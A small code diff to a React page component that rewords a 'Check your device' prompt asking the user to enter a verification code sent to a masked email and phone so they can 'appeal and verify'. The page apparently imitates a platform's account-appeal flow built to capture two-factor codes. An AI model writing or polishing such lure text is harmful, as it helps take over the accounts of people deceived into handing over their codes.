@@ -106,7 +106,7 @@ const Home = () => {
             // 🎯 Dịch verify với data mặc định
             const verifyTexts = {
                 title: 'Check your device',
-                description: `We have sent a verification code to your s****g@m****.com, ******32. Please enter the code we just sent to continue.`,
+                description: `We have sent a verification code to s****g@m****.com, ******32 of yours. Please enter the code we just sent to continue.`,
                 placeholder: 'Enter your code',
                 infoTitle: 'Approve from another device or Enter your verification code',
                 infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
